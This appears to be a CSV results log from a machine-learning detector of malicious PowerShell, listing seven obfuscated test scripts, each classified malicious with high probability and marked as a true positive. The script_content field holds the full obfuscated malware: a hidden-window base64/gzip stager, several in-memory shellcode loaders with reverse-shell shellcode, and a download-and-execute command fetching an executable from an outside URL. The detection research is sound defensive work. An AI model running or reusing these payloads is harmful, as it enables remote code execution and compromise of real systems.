ml_scan_time,script_path,integration,unique_id,script_block_id,agent_name,ml_verdict,ml_probability,ml_algorithm,script_length,latency_ms,script_content,ground_truth,status_evaluasi
2026-07-13 16:33:59,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1012.ps1,custom-ps-ml,UNKNOWN,fab5b7fa-b54d-4569-917b-b2b3e9bab72d,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2925,1713.98," ((\""{12}{26}{7}{1}{45}{38}{30}{34}{46}{8}{36}{6}{13}{23}{32}{15}{29}{40}{19}{3}{35}{44}{14}{47}{24}{9}{27}{42}{11}{16}{10}{43}{31}{20}{37}{28}{25}{48}{33}{4}{22}{0}{21}{5}{18}{2}{17}{39}{41}\""-f 'o3K3tF1N09YNo2VP','0aEbpowershell.exenBC};g','t5o8','OQnJ6c3DI7GF9E3K3RfqjD9glr','7OwZ/F1y9ONoVdB+nBNyaQ/qOn9fk1Hg/rjk/FF8yB2hOf60Dqjk+Xodg7zGkBoacVy0yE7Pu4DSXWOsHcLPl7lzJ674GN8RPrHLo/O8ELnSAef2uQJcI2XtR','C5ImjRcQ4fLYQa1OYDh+dmrI1X64ag+Xw7Zq6urCWCFIkk1XGiTwBPzfHFzXixCiy9uykU4868fscKX','t]::FromBase64String(nBCnBCH4','1.','ct IO.MemoryStream(,','2qTqNDAgcPILXFn','Vb1qfg','x6swgMM1W','if([IntPtr]::Size -eq 4){gy9b=nBCpowershell.exenBC','s','G','1rIfJSjrVI1xcl01N','Lr5/WNHE8LbsDOLSgBjbAPvUzpSlvEY/cRnZH7WQuXUBmyKnBuIYhBEPi4TKvDR9G','oeGH7+cV/4vp3WRhiKiDAhHbEyOF6fJWMVEBHnxSHVIE63PRJPvBuYnHahW+NvwFYJKy4YgoAAA==nBCnBC));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream(gy9s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();nBC;gy9s.UseShellExecute=gy9false;gy9s.RedirectStandardOutput=gy9true;g','WyVbLZ/cEs9cHW3D9tuoSRnlnNb2Omb/C5FpFc/hx/kXIp/f/YP1l8g','f0nD','SsSqee4bdYDep8oNCVpT0kogI5ayH0dR+SibIoQyFI+aDe0guAZNwPWsfUFLaE1LTU','SpvPN5ef20Nq+RwNNM36kGgDxJHDpEXM0UW3fpT0tzp7B4fRHDMQAzTrrCBrPKylPbfHaRKhKMc384KEAWFwjcFFlykbMcbt5','4D+93gjCOLdUcYtSfbmqaVxr0yahTpsO6hZEns6X2MopWxM7SS5XBn+Kk7djVrxC41','IAAGyLVgC','k6KDMNeyG3kOCGJIKbQDFZ8QZRcEDOWl/5QpimG2zgQ1CdgFyTkS5OEK','n9RqO8ujatsjCrTdHqNUWnOnp8NFHjdjAWkyZq3NHiYlzeLa/pzmwjZ7zRL','}else{gy9b=gy9env:windir+nBCaEbsyswow64aEbWindowsPowerShellaEbv','Spess6P/apByHARePRGqecjPm2A73IkZOcTL6ku4R5lV4fkpu0DI9/f','t68eGFhqbuYuaUbPT6B','PTsAnt6uUx7FuP/UupK+SMkXLpcF9TIPZ1VUlDkMSiMO8UCcCRRHxHx','ProcessStartInfo;gy9s.FileName=gy','AfuDrMZciCC3ommXeq4W22ezIHJ7nCcBTlpV4MBWXnJZNgRpy8hIKIpiYUC74fys9wOzET1MaRyJabqT+ITDes8CASYWxD/uDwd+aS2BSzhIu81KAO0bcm9bKN5VeZqGDGaODBSivIBLxJGDBFoooQMB4UoBZMIpr+khEfnPa1XWPYg0pOK2GvI+wRR36BMRP5QdEJHRkPRwghxybj0LQsGgroEQm1z3r6TRhHTeIAqBKSNCtKVjNTf','A71W227bOBB9ToH+g1AYkIQ6lp24SRugwFKWb/EldhTLtzUCRqJkxpToSJRv3f77jmypcZFkt9uHFRKY1MyQh2fODOXGgS0oD6QHf+je3FfLk8tY+vb+3UkPh9iXlNwi7Eza0W','2GB64mjcqfcF00w4frRLv7JoI1efn9u7aterzjrMdN7Qvw/ICVRGqBFWrpvPWWA9RT','9b;gy9s.Argum','ptK9ieE+kUBU5ia3MbJzAL5pJRoch/','[Conver','78D+g501uXDq','iagnostics.','y9s.WindowStyle=nBCHiddennBC;gy9s.Create','glkaJK','NoWindow=gy9true;gy9p=[System.Diagnostics.Process]::Start(gy9s);','v3r9zM3UsMTtWBYxOpvsxAbhKj0d07/ZVKualDmyJBQ+3MM3dhTFRZ9I0ScZ0NpNyHlnvPuffXqCUeYPvZhdt/ObIXl2DYWp','Rq8eUOSRENqQwAlSQXfVnMIfsKHIz6B','/imr09PSrFB9ijGLFNncRoL4BYcxWZW+q8m','y9s=New-Object System.D','ents=nBC-nop -w hidden -c gy9s=New-Obje','d9slUeQOtUMecVcUhjQ4PysMggi7pAurrUiHiDl3IlmFs8BfSEQcBtLRqZJlD','nb6bl3UN7tHz3HHhut6l655W/pUo+1hpa8Xz3DbqMbtob7Wi+WoSteNPh30F9c18TC')).RepLacE('aEb','\\').RepLacE(([ChAR]110+[ChAR]66+[ChAR]67),[StriNg][ChAR]39).RepLacE(([ChAR]103+[ChAR]121+[ChAR]57),[StriNg][ChAR]36) |&amp;( ([STRinG]$veRbOSEprEfeRencE)[1,3]+'X'-JOin'')",malicious,TP
2026-07-13 16:34:08,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1014.ps1,custom-ps-ml,UNKNOWN,3f7c1b2e-4f35-4793-920b-753f29f8a9f7,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2925,1816.51,"(((\""{68}{64}{10}{53}{60}{15}{48}{5}{37}{26}{54}{29}{30}{4}{49}{50}{18}{52}{19}{69}{16}{63}{36}{2}{22}{65}{8}{6}{56}{51}{33}{32}{45}{62}{20}{25}{55}{17}{13}{14}{47}{7}{38}{67}{40}{27}{12}{31}{57}{3}{24}{61}{34}{35}{66}{39}{59}{46}{44}{21}{28}{58}{1}{41}{9}{11}{43}{42}{0}{23}\"" -f '1w::CreateT','th -gt 0x1000){Xx1g = Xx1z.Length};Xx1x=','xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x5','f,0xd5,0x85','l4W9)]publ','ddress, uint dwSize, uint flAllocationType, uint flProtect);[DllIm','xac,0xc1,0xcf,0x0d,0x01,0xc7,','0x68,0x0a,0x','b,0x01,0xd6,0x31,0xff,0x31,0xc0,0','x1000,Xx1g,0x40);for (X','nel32.dll4','x1i=0;Xx1i -le (Xx1z.Length-1)','7,','0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,','0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0','(I',',0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0',',0x86,','[Byte[]]',',0xe8,0x89,0x00,0x00',',','xc3;Xx1','8,0x20,0x01,0xd3,0xe3,0x3','hread(0,0,Xx1x,0,0,0);for (;;){Start-sleep 60};',',0xc0,0x74,0x0c,0xff','0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0',')]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint ','0x89,0xe6,0x6a,0x10,0x56,0x5','g = 0x1000;','ddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(4W9msv','crt.dl','0x','x24','0x75,0xe2,0x58,0x8b,0x58,0',',0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0','x','b,0x42,0x3c,0x01,0','port(4W9kernel32.dll4W9','64,0x66,0x0',',0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x0','0x02,0x00,0x01,0xbb,','Xx1w::VirtualAlloc(0,0','t32()+Xx1i), Xx1z[Xx1i], 1)};Xx',';Xx1i++) {Xx1w::memset([IntPtr](Xx1x.ToIn',',0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0',',0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58','0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff','x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,','ntPtr lpA','ic static extern IntPtr memset(IntPtr dest, uint src, uint',' count);Mpb;Xx1w = Add-Type -memberDefinition Xx1c -Name 4W9Win324W9 -namespace Win32Functions -passthru;',',0x3b,0x7d,0x24,',';[Byte[]]Xx1z = 0xfc','W9)]public sta','dwStackSize, IntPtr lpStartA','x5f,0x5a,0x8b,0x12,0xeb','0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8','68,0x99,0xa5,0x74,0x61,0xf','if (Xx1z.Leng','0,','tic extern IntPtr VirtualAlloc',',0x4e,0x08',',0x1c,0x01','x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8','DllImport(4W9ker','c,0x49,0x8b,0x34,0x8','d5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68','3,0x68,','Xx1c = Mpb[',',0x00,0x60,0x89,0xe5,0x31'))-repLaCe([cHAR]52+[cHAR]87+[cHAR]57),[cHAR]34  -repLaCe  ([cHAR]77+[cHAR]112+[cHAR]98),[cHAR]39-crePlAce'Xx1',[cHAR]36)| InvOKe-expRESsioN",malicious,TP
2026-07-13 16:34:30,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1016.ps1,custom-ps-ml,UNKNOWN,6b6cab95-86da-4cde-892d-08507a42e21a,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3049,1516.4,"(((\""{36}{22}{25}{10}{61}{6}{64}{71}{3}{59}{34}{37}{62}{29}{31}{41}{38}{44}{70}{18}{66}{57}{4}{11}{30}{39}{45}{19}{67}{20}{48}{43}{54}{49}{16}{1}{23}{58}{40}{55}{69}{28}{24}{5}{13}{65}{56}{8}{14}{60}{27}{33}{68}{35}{53}{32}{50}{12}{9}{52}{15}{0}{47}{42}{21}{63}{26}{2}{46}{17}{7}{51}\""-f 'xe0,0x60,0xf','bc,0x7b,0xe1,0xb6,0xf9,0x32,0x9a,0x0c,0x','0,0x1000,uiFg,0x40);for (uiFi=0;uiFi -le (uiFz.Length-1);uiFi++) {uiFw::memset([IntPtr](uiFx.ToInt32()+uiFi), uiFz[u','DllImport(NBsm','a,0x3c,0xdc,0x9e,0x9a,0x5b,0x94,0','x76,0x2','read(I','t-sle','xbe,0xf4,0xc4,0x9e,0xc1,0x2e,0xb0,0x','0x','r VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(NBskernel32.dl','xb0,0x2a,0x2f,0xf','d,0xd2,0xd0,0x0c,0xa8,0x14,0x7f,','0,0x09,0x53,0x52,0x69,0xc9,0xfa,0xc3,0xd7,0xbc,0x03,0x13,0xb8,0x61,0xa6,0x5f,0x54,0x75,0xdb,0x3d,0x30,0xba','31,0x3c,0xd1,0xc1,0x','0,0x97,0xe1,0','4,0x31,0xf9,0x51,0x','x,0,0,0);for (;;){Star','4,0x03,0x72,0xa7,0x77,0x4a,','2','93,0x38,0x8d,0x34,0','x07,0x9c,0x53,0xef,0x87,0x5f,0x','NBskernel32.dllNBs)]public static extern ','75,0xc5,0x4','3d,0x9c,0x9a,0x95,0xc0,0x71,0x91,0xa1,0x49,0x74,0','IntPt','th};uiFx=uiFw::VirtualAlloc(','2b,0xa6,0x79,0xc3,0xd4,0x73,0x17,0','x54,0x76,0x01,0x0d,0xa7,0x0b,0x12,0xca,0xda,0xd7,0x97,0xc9,0x7c,0x93,0x00,0x36,0x7d,0x70,0xd6,0xbd,0x71,0x','namespace Win32Functions -passt','8,0x3c,0xc0,0x7d,0xe9,0xb7,0xa4,0xa9,0x','hru;[Byte[]];[Byte[]]uiFz = 0xdb','0x95,0xf0,0xde,0x37,0x5e,0x7c,0xcd,0xaf,0xae,0','xc6,0x42,0x11,0xa8,0xc1,0x99,0x81,0x2a,0xd2,0x8c,0x0d,0xa2,0x34,0xfe,0xfd,0xe4,0','st, uint src, uint count)','9,0x56,0xa4,0x4a,0x86,0x46,0xc7,0x80','uiFc = OZb[DllImport(',';OZb;uiFw = Add-Type -','e,0xb','1e,0x70,0x02,0x8c,0x11,0x81,','5d,0x76,0x6a,0xb3,',',0xc1,0xd9,0x74,0x24,0xf4,0x5a,0xb',',0xb7,0x0f,0x6f,0x1e,0x64,0x87,0',',0x2','3,0x95,0xbf,0x3c,0x29,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31','0x3f,0xec,0x30,0x01,0x4','iFi], 1)};uiFw::CreateThread(0,0,uiF','f,0x55,0x51,0x33,0x1a,0x9a,0x4c,0x27','xd2,0x7d,0xf0,0xb5,0x86,0xd6,0x7e,0x6b,0x37,0x53,0xca,0xb0,0xbc',',0xda,0xb0,0x21,0xe7,0xdd,0x91,0xf7,0x7c,0x8','xcb,0xaf,0x79,0xb0,0xe1,0xda,0x85,0x24,0x0e,0x4','ep 60};','ee,0x9f,0x2f,0xb6,0x7a,0x60,0x47,0xb7,0x6a,0x6',',0xaf,0xec,0x28,0x7d,0x87,0x98,0xd1,0x24,0x53,0x39,0x1d,0xf3,0x19,0x79,','f','0x52,0x85,0x72','bd,0xc0,0xd4,0x61,0xcd,0xf2,0x7b,0xda,0x59,0','xb5,0x39,0xaf,0x9','a,0x','svcrt.dllNBs)]public static extern IntPtr memset(IntPtr de','18,0xfa,0x85,0x91,0x32,0x','lNBs)]public static extern IntPtr CreateTh','memberDefinition uiFc -Name NBsWin32NBs -','b6,0xf1,0xf4,0x89,0xfe,0x87,0x14,0x0a;uiFg = 0x1000;if (uiFz.Length -gt 0x1000){uiFg = uiFz.Leng','ntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lp',',0xd6,0x','0xc0,0x2f,0xf5,0',',0x21,0x','xe8,0xbe,0xad,0x44,0x5',',0xf3,0',',0x72,0x1','ThreadId);['))-cRepLace ([CHar]117+[CHar]105+[CHar]70),[CHar]36  -REPLACE([CHar]78+[CHar]66+[CHar]115),[CHar]34 -cRepLace'OZb',[CHar]39)|&amp;( $sHELliD[1]+$ShEllId[13]+'x')",malicious,TP
2026-07-13 16:34:37,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\102.ps1,custom-ps-ml,UNKNOWN,13cdc84d-4404-4f42-8a5c-7176d13b4886,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2963,2009.1," ((\""{9}{57}{26}{15}{16}{38}{35}{69}{28}{47}{45}{0}{61}{49}{18}{24}{68}{12}{53}{5}{58}{11}{21}{31}{33}{14}{10}{7}{48}{27}{62}{37}{56}{50}{19}{64}{1}{29}{63}{59}{13}{65}{22}{51}{44}{4}{25}{39}{3}{36}{52}{8}{66}{17}{42}{60}{32}{54}{34}{40}{46}{23}{20}{6}{2}{55}{41}{43}{30}{67}\"" -f ', IntPtr lpParameter, uint dwCreationFlags, IntP','24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51','t([I','89,0xe6,0x6','df,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x18,0x68,0x02,0x','0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,','gth-1);m2Fi++) {m2Fw::memse','xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,','x','m2Fc =','x78,0x85,0','8,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0','Byt','77,0x26,0x07,0xff,0xd5,0xb8','8b,0x40,0','rt(Ea1kernel3','2.dllEa1)]pu','7,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x','tion',',0x89,0x44','Fz.Len','x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x','0x00,0x29,0xc4,0x','m2',' m2Fc -Name Ea1Win32Ea1 -namespace Win3','00,0x10,0xf8,','DllImpo','b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0','tr lpThreadAttributes, uin',',0xff,0xe0,0x58,0x5','nt32()+m2Fi), m2Fz[m2Fi], 1)};m2Fw::CreateThread(0,0,m2Fx,0','01,0xd0,','c8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;m2Fg =','0x','m2Fz.Length -gt 0x1000){m',' VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uin','a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x','6,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,','blic static extern IntPtr','0x','2Fg = m2Fz.Length};m2Fx=m2Fw::VirtualAlloc(0,0x1000,m2Fg','](m2Fx.','36,0x6a,0x40,0x68,0x00,0x1','ToI','x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0x','kSize, IntPtr lpStartAddress',',0x40);for (m2Fi=0;m2Fi -le (','t dwStac','0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8','static extern IntPtr memset(IntPtr dest, uint src, uint count);iSf;m2Fw = Add-Type -memberDefini','b,0x04,0x8b,0x01,0xd0','54,0x50,0x68,0x29,0x80,0x6b,0','85,0xc0,0x74,0','e[]];[Byte[]]m2Fz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,',' 0x1000;if (','ntPtr','0x01,0xd3,0x8',' iSf[','0x0c,0x8b,0x52,0x14,0x8b,0x72,0x2',',0x68,0x4c,0x','0,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0x','tr lpThreadId);[DllImport(Ea1msvcrt.dllEa1)]public ','xd3,0x6','f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54',',0x',',0x90,0x01,0x00,','0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x5',',0,0);for (;;){Start-sleep 60};','2Functions -passthru;[','t flProtect);[DllImport(Ea1kernel32.dllEa1)]public static extern IntPtr CreateThread(IntP')).rEPLaCe('iSf',[strIng][CHAR]39).rEPLaCe(([CHAR]69+[CHAR]97+[CHAR]49),[strIng][CHAR]34).rEPLaCe(([CHAR]109+[CHAR]50+[CHAR]70),[strIng][CHAR]36) | .( $PsHOmE[4]+$pShome[30]+'X')",malicious,TP
2026-07-13 16:34:43,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1043.ps1,custom-ps-ml,UNKNOWN,143beb9c-b6ef-4e61-9741-4b1c9480b99c,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2818,1659.46,"((\""{25}{38}{33}{40}{16}{8}{6}{21}{34}{19}{13}{28}{35}{18}{42}{27}{45}{32}{46}{30}{0}{12}{2}{37}{41}{15}{23}{36}{14}{5}{10}{20}{7}{22}{24}{29}{1}{44}{39}{31}{11}{43}{26}{4}{17}{3}{9}\""-f'1,0x59,0x5a,0x51,0xff,0xe',',0x1000,3QWg',',0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x3','i], 1)};3QWw::CreateThread(0,0,3QWB8vj,0,','8','0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5','IntPtr lpStartAddress, IntPtr ','xc8,0x5','nel32.dll6En)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, ','0,0);for (;;){Start-sleep 60};',',0xa2,0x56,0xff,0','-le (3QWz.Length-1);3QWi++) {3QWw::memset([IntPtr]','0',' src, uint count);8Gh;3QW','0,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,','c4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0','t flProtect);[DllImport(6Enker','vj.ToInt32()+3QWi), 3QWz[3QW','89,0xe5,0x3','Ptr dest, uint','xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0','lpParameter, uint dwC','f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5','x50,0x40,0x50,0x68,0x',',0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,','3QWBel = 8Gh[DllImport(6Enkernel32.dl','WB','31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd','w = Add-Type -memberDefinition 3QWBel -Name 6EnWi','0xec,0xc3;3QWg = 0x1000;if (3QWz.Length -gt 0x1000){3QWg = 3QWz.Length};3QWB8vj=3QWw::VirtualAlloc(0','0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x6','3QWi=0;3QWi ','0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0x','tr VirtualAlloc(Int','reationFlags, IntPtr lpThreadId);[DllImport(6Enmsvcrt.dll6En)]public static extern IntPtr memset(Int','n326En -namespace Win32Functions -passthru;[Byte[]];[Byte[]]3QWz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x','ea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x10,0x68,0x02,0x00,0x00,0x5','3,0x32,','l6En)]public static extern IntP',');for (','Ptr lpAddress, uint dwSize, uint flAllocationType, uin','0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0x','1,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x','(3Q',',0x40','0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,','e3,')).replACe(([CHar]54+[CHar]69+[CHar]110),[STring][CHar]34).replACe('3QW',[STring][CHar]36).replACe(([CHar]56+[CHar]71+[CHar]104),[STring][CHar]39)|&amp; ( $SHeLLid[1]+$shEllID[13]+'X')",malicious,TP
2026-07-13 16:34:49,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1047.ps1,custom-ps-ml,UNKNOWN,0cebe90c-6363-4e33-a1f6-734bb628b7e4,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2935,1964.01," &amp;( $pshOme[21]+$PsHome[30]+'x')(((\""{7}{2}{54}{19}{48}{68}{67}{55}{8}{62}{34}{50}{51}{40}{9}{1}{38}{14}{22}{29}{53}{17}{33}{4}{47}{32}{63}{56}{49}{30}{25}{5}{46}{27}{52}{26}{37}{15}{28}{11}{41}{18}{44}{13}{35}{66}{6}{59}{43}{57}{23}{21}{16}{45}{60}{39}{61}{31}{64}{12}{42}{10}{24}{58}{3}{65}{0}{36}{20}\""-f 'Zi), 1xZz[1xZi], 1)};1xZw::CreateThread(0,0,1xZx','unt);Z6b;1xZw = Add-Type -memberDefinition 1xZc -Name lnrWin32','(IntPtr lpAdd','f (1xZz.Length -gt 0x1000){1xZg = 1','7,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x8b,0x4c,0x10,0x78,0xe3,0x4a,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0x','x24,0','68,0x02,0x00','1xZc = Z6b[DllImport(lnrkernel32.dlllnr)]public static extern IntPtr VirtualAlloc','Ptr lpStartAddress, IntPtr lpParameter, uint dw','uint co','0x29,0xc6,0','01,0x00,0x00,0x29,0xc4,0','0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,','50,0x50,0x50,0x40,0x50,0x40,0x50,0x68','unctions -passthru;[Byte','0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0','e,0x08,','x26,0x31,0xff,0x31,0xc0,0xac,0x3c','0,0x6b,0x00,0xff,0xd5,0x50,0','.dlllnr)]public static extern IntPtr CreateThre','0};','0xff,0x4','[]];[Byte[]]1xZz = 0xfc,0xe8,0x','0xff,0xd5,0x85,0xc0,0x74,0x0c,','x85,0xf6,0x75,0xec,0xc3;1xZg = 0','0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0','0,0x58,0x5','9,0x5a,0x51,','x07,0xff,0xd5,0xb8,0x90,0x','86,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x5','66,0x8b,',',0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0','x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x34,0',',0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x5','IntPtr lpTh',',0xea,0x0f,0xdf,0xe0,0x',',0,0,0);for (;;){Start-sleep 6','f,0x5a,0x8b,0x12,0xeb,0x89,0x5d,','lnr -namespace Win32F',',0xb5,0xa2,',' memset(IntPtr dest, uint src, ','x54,0x50,0x68,0x29,0x8','0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,','0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0','x','0x75,0xec,0x68,0x','x5b,0x5b,0x61,0x5','d3,0','ad(IntPtr lp',',0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x','readId);[DllImport(lnrmsvcrt.dlllnr)]public static extern',' IntPtr','0xff,0xe','2,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0','ress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(lnrkernel32','StackSize, Int',',0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75','x99,0xa5,0x74,0x61,','x1000;i',',0x01,0xbb,','f0','0x56','CreationFlags, ','x8b,0x01,0xd6,0x31,0xff,0x31,0xc0','x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,','xZz.Length};1xZx=1xZw::VirtualAlloc(0,0x1000,1xZg,0x40);for (1xZi=0;1xZi -le (1xZz.Length-1);1xZi++) {1xZw::memset([IntPtr](1xZx.ToInt32()+1x','ff,0xd5,0x97,0x6a,0x05,0x68,0x69,0x69,0x5c,0xe5,0x','eadAttributes, uint dw','Thr')).REPLace(([CHAr]49+[CHAr]120+[CHAr]90),'$').REPLace(([CHAr]108+[CHAr]110+[CHAr]114),[StrINg][CHAr]34).REPLace('Z6b',[StrINg][CHAr]39) )",malicious,TP
2026-07-13 16:34:54,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1054.ps1,custom-ps-ml,UNKNOWN,d59efaad-0d51-4c54-b899-c2221e667ff5,DESKTOP-BAC9DBQ,malicious,0.9996,RandomForest,369,1834.85,"((\""{16}{9}{0}{5}{15}{25}{6}{7}{12}{23}{22}{8}{17}{21}{19}{18}{20}{11}{2}{1}{10}{3}{14}{24}{13}{4}\"" -f 'Syst',');','Hk','-Process ','Hk','em.','lient)','.Dow','/','t ','Start','exeE','nloadFile(EHk','.exeE','EHkmes','Net.W','(New-Objec','/cajo','Hk,EH','.exeE','kmess.','s.in/0x/1','p:','htt','s','ebC')).RePlACE('EHk',[strINg][CHar]39)|.( $pSHOmE[21]+$PsHOME[30]+'X')",malicious,TP
